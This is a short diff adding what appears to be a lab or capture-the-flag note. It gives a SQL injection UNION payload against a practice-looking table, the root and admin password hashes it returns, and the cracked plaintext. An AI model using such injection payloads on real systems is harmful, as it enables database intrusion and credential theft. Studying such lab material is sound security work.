@@ -1,0 +1,11 @@
+# Run the following:
+1 UNION (SELECT username, password FROM Member_Brute_Force .db_default) 
+
+# Formatted result is:
+username: root
+password: 3bf1114a986ba87ed28fc1b5884fc2f8
+
+username: admin
+password: 3bf1114a986ba87ed28fc1b5884fc2f8
+
+# Password is hashed with md5, value is shadow.
